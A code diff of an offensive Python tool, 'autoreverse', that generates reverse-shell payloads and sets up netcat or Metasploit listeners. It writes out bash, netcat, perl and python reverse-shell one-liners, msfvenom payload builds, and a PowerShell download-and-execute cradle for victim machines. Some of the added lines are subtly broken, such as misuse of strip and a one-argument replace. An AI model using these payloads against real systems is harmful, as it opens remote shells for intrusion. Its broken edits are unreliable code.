@@ -1,11 +1,11 @@
 #!/usr/bin/python3
 
 from simple_colors import *
-import os, argparse, socket, time
+import os, argparse, time, re, socket
 
 ap = argparse.ArgumentParser()
 
-ap.add_argument('-I', '--interface', required=True, type=str, help='Select the network interface.')
+ap.add_argument('-I', '--interface', required=False, type=str, help='Select the network interface.')
 
 ap.add_argument('-P', '--port', required=True, type=str, help='Select the port you want to use.')
 
@@ -17,9 +17,19 @@ ap.add_argument('-a', '--architecture', required=False, type=str, help='Define t
 
 ap.add_argument('-http', '--httpserver', required=False, type=str, help='Create an http server on the port you specified.')
 
+ap.add_argument('-i', '--ip', required=False, type=str, help='Select the IP Address')
+
 args = ap.parse_args()
 
-ActualPath = os.popen('pwd').read().replace('\n', '')
+if os.getuid() != 0:
+    print(red('You must be root to run autoreverse'))
+    exit()
+
+if args.interface == None and args.ip == None:
+    print(red('You must specify a network interface or an IP address.'))
+    exit()
+
+ActualPath = os.popen('pwd').read().strip('\n')
 
 print(yellow('Autoreverse made by CronoX\n\nhttps://github.com/CronoX1\n--------------------------'))
 
@@ -27,7 +37,7 @@ if os.path.exists('/usr/local/bin/autoreverse.py') == False:
     print(blue('\nCreating a symbolik link so you can use the tool in all directories (autoreverse.py).'))
     os.system('dos2unix autoreverse.py 2>/dev/null')
     os.system('chmod +x autoreverse.py')
-    os.system('ln -s ' + ActualPath + '/autoreverse.py /usr/local/bin/autoreverse.py')
+    os.system('ln -s ' + ActualPath + '/autoreverse.py /usr/local/bin/autoreverse')
 
 payload = args.payload.lower()
 
@@ -48,9 +58,13 @@ except:
     exit()
 
 def Get_IP(NT = args.interface):
-    IP = os.popen("ifconfig " + str(NT) + " 2>/dev/null | sed -n '2 p' | awk '{print $2}'").read().replace('\n', '')
-    if IP == '':
-        print(red("Your network interface doesn't exist."))
+    if args.ip:
+        IP = args.ip
+    else:
+        IP = os.popen("ifconfig " + str(NT) + " | sed -n '2 p' | awk '{print $2}'").read().strip('\n')
+    patron = r'^(\d{1,3}\.){3}\d{1,3}$'
+    if re.match(patron, IP) == None or IP == '':
+        print(red("Your network interface or IP address doesn't exist."))
         exit()
     else:
         return IP
@@ -65,13 +79,13 @@ def msf_list(IP = Get_IP(), PORT = port):
     print(blue('Setting up your listener in metasploit.\n'))
     print(green('Waiting to say I\'m in...\n'))
     command = 'msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp ;set LHOST ' + IP + ' ;set LPORT ' + PORT + ' ; exploit" 2>/dev/null'
-    if (arch == 'x86' or arch == '86') and (payload == '.exe' or payload == 'exe' or payload == '.dll' or payload == 'dll' or payload == 'aspx' or payload == '.aspx'):
-        command = command.replace('/x64', '')
+    if (arch == 'x86' or arch == '86') and (payload == 'exe' or payload == 'dll' or payload == 'aspx'):
+        command = command.strip('/x64')
         os.system(command)
         exit()
     elif arch == 'x86' or arch == '86':
         command = command.replace('x64', 'x86')
-    if payload == '.exe' or payload == 'exe' or payload == '.dll' or payload == 'dll' or payload == 'aspx' or payload == '.aspx':
+    if payload == 'exe' or payload == 'dll' or payload == 'aspx':
         os.system(command)
     else:
         os.system(command.replace('windows', 'linux'))
@@ -100,7 +114,7 @@ def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, arch='64'):
     if msf == True:
         msfvenom = msfvenom.replace('shell_', 'meterpreter/')
     if (arch == 'x86' or arch == '86') and (payload == '.exe' or payload == 'exe' or payload == '.dll' or payload == 'dll'):
-        msfvenom = msfvenom.replace('/x64', '')
+        msfvenom = msfvenom.replace('/x64')
     elif arch == 'x86' or arch == '86':
         msfvenom = msfvenom.replace('x64', 'x86')
 
@@ -108,11 +122,13 @@ def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, arch='64'):
         print(blue('\nYour payload is:\n\n') + red('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' + IP + ' ' + PORT + ' >/tmp/f'))
     elif payload == 'bash':
         print(blue('\nYour payload is:\n\n') + red('bash -i >& /dev/tcp/' + IP + '/' + PORT + ' 0>&1'))
+    elif payload == 'perl':
+        print(blue('\nYour payload is:\n\n') + red('perl -e \'use Socket;$i="' + IP + '";$p=' + PORT + ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''))
     elif payload == 'nc':
         print(blue('\nYour payload is:\n\n') + red('nc -e /bin/sh ' + IP + ' ' + PORT))
-    elif payload == 'python' or payload == '.py':
+    elif payload == 'python':
         print(blue('\nYour payload is:\n\n') + red("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + IP + "\"," + PORT + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"))
-    elif payload == 'php' or payload == '.php':
+    elif payload == 'php':
         file = 'autoreverse.php'
         Check_files(file)
         os.system('cp /opt/autoreverse/autoreverse.php .')
@@ -125,7 +141,7 @@ def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, arch='64'):
         if args.httpserver != None:
             print(blue('\nDownload your payload on the victim machine with: ') + red("\nwget http://" + IP + ":" + args.httpserver + "/" + file))
         message(file)
-    elif payload == 'elf' or payload == '.elf':
+    elif payload == 'elf':
         file = 'autoreverse.elf'
         print(blue('\nCreating the payload, please wait.'))
         msfvenom = msfvenom.replace('windows', 'linux').replace('exe', 'elf')
@@ -133,19 +149,19 @@ def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, arch='64'):
         if args.httpserver != None:
             print(blue('\nDownload your payload on the victim machine with: ') + red("\nwget http://" + IP + ":" + args.httpserver + "/" + file))
         message(file)
-    elif payload == 'war' or payload == '.war':
+    elif payload == 'war':
         file = 'autoreverse.war'
         print(blue('\nCreating the payload, please wait.'))
         msfvenom = msfvenom.replace('windows/x64/','java/jsp_').replace('exe','war')
         os.system(msfvenom)
         message(file)
-    elif payload == 'aspx' or payload == '.aspx':
+    elif payload == 'aspx':
         file = 'autoreverse.aspx'
         print(blue('\nCreating the payload, please wait.'))
-        msfvenom = msfvenom.replace('/x64','').replace('exe','aspx')
+        msfvenom = msfvenom.strip('/x64').replace('exe','aspx')
         os.system(msfvenom)
         message(file)
-    elif payload == 'powershell' or payload == 'ps1' or payload == '.ps1':
+    elif payload == 'powershell' or payload == 'ps1':
         file = 'autoreverse.ps1'
         Check_files(file)
         os.system('cp /opt/autoreverse/autoreverse.ps1 .')
@@ -153,14 +169,14 @@ def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, arch='64'):
         if args.httpserver != None:
             print(blue('\nInvoke your payload on the victim machine with: ') + red("\npowershell IEX(New-Object Net.WebClient).downloadString('http://" + IP + ":" + args.httpserver + "/" + file + "')"))
         message(file)
-    elif payload == 'exe' or payload == '.exe':
+    elif payload == 'exe':
         file = 'autoreverse.exe'
         print(blue('\nCreating the payload, please wait.'))
         os.system(msfvenom)
         if args.httpserver != None:
             print(blue('\nDownload your payload on the victim machine with: ') + red('\ncurl "http://' + IP + ':' + args.httpserver + '/' + file + '" -o autoreverse.exe'))
         message(file)
-    elif payload == 'dll' or payload == '.dll':
+    elif payload == 'dll':
         file = 'autoreverse.dll'
         print(blue('\nCreating the payload, please wait.'))
         os.system(msfvenom.replace('exe', 'dll'))
@@ -173,12 +189,13 @@ def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, arch='64'):
 
 def Check_Port(port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    if s.connect_ex(('127.0.0.1', int(port))) == 0:
-        process = os.popen('lsof -i -P -n | grep LISTEN | grep ' + port + ' | awk \'{print $1, $2}\'').read().replace('\n', '')
+    if s.connect_ex(('0.0.0.0', int(port))) == 0:
+        process = os.popen('netstat -ltnup | grep ":' + str(port) + '" | tr -s "/" " " | awk \'{print $8, $7}\'').read().strip('\n')
         print(red('The port is already being used by ' + process + '.'))
         exit()
 
 def listeners():
+    msf_payloads = ['exe', 'dll', 'elf', 'war', 'aspx']
     if args.listener == 'nc' or args.listener == 'netcat':
         if arch == 'none':
             Configure()
@@ -186,6 +203,11 @@ def listeners():
             Configure(arch = arch)
         print(green('\nWaiting to say I\'m in...\n'))
         nc_list()
+        exit()
+    elif args.payload not in msf_payloads:
+        print(red('You can only use a meterpreter listener for the next payloads:'))
+        for i in msf_payloads:
+            print(red(' - ' + i))
         exit()
     elif args.listener == 'msf' or args.listener == 'metasploit':
         if arch == 'none':
@@ -200,10 +222,9 @@ def listeners():
 
 if args.httpserver != None:
     Check_Port(args.httpserver)
-    server = 'python3 -m http.server ' + str(args.httpserver) + ' > /tmp/autoreverse.log 2>/dev/null &'
-    os.system(server)
-    time.sleep(0.04)
-    process = os.popen('lsof -i -P -n | grep LISTEN | grep ' + str(args.httpserver) + ' | awk \'{print $1, $2}\'').read().replace('\n', '')
+    os.system('python3 -m http.server ' + str(args.httpserver) + ' > /dev/null &')
+    time.sleep(0.07)
+    process = os.popen('netstat -ltnup | grep "80" |tr -s "/" " " | awk \'{print $8, $7}\'').read().strip('\n')
     print(blue('\nHTTP server running on port ' + str(args.httpserver) + ' (Process: ' + process + ').'))
 if args.listener != None:
     Check_Port(args.port)
